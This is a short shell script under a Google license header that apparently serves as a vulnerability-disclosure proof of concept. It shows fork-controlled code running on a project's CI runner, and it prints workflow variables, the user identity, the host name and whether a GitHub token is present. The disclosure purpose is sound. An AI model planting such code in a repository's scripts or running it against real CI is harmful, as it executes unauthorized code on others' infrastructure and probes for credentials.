# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

echo "✅ Success"

# --- PoC for Google OSS VRP issue 559494550 (authorized disclosure) ---
# Demonstrates that `custard` executes this fork-controlled script on the
# Google CI runner via the workflow_run -> setup-custard -> Run Custard chain.
# Read-only: prints identity/host/token-presence only. Exfiltrates nothing.
echo "=== custard RCE PoC (issue 559494550) ==="
echo "workflow:    ${GITHUB_WORKFLOW}"
echo "repository:  ${GITHUB_REPOSITORY}"
echo "event:       ${GITHUB_EVENT_NAME}"
echo "run id:      ${GITHUB_RUN_ID}"
echo "actor:       ${GITHUB_ACTOR}"
echo "cwd:         $(pwd)"
echo "--- identity ---"
id
echo "--- runner host ---"
hostname
echo "--- token present? (value not printed) ---"
env | grep -c '^GITHUB_TOKEN=' | sed 's/^/GITHUB_TOKEN count: /'
echo "=== end PoC ==="
